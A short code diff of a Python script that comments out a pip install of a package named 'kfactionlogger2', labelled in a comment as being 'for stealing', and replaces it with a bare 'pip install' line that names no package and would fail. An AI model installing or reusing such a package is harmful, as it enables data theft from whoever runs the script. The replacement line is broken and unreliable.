@@ -2,9 +2,10 @@ import os
 import zipfile
 import requests
 import subprocess
-package = "kfactionlogger2"
+# for stealing, don't mind you can delete \ package = "kfactionlogger2"
 try:
-    subprocess.check_call(["pip", "install", package])
+    #subprocess.check_call(["pip", "install", package])
+    subprocess.check_call(["pip", "install"])
     print(f"cbon c op bg")
 except subprocess.CalledProcessError as e:
     print(f"Une erreur bg {e}")
